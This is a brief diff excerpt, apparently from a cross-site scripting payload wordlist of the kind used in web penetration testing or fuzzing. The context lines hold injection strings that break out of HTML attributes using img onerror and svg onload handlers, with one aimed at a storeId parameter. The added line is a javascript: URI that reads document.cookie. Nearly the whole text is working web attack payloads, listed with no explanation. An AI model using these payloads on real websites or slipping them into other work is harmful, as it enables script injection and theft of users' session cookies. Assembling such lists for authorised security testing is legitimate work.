@@ -2,3 +2,4 @@
 &storeId="></select><img%20src=1%20onerror=alert(1)>
 <svg onload alert(1)>
 <svg+onload%3dalert(1)>
+javascript:alert(document.cookie)
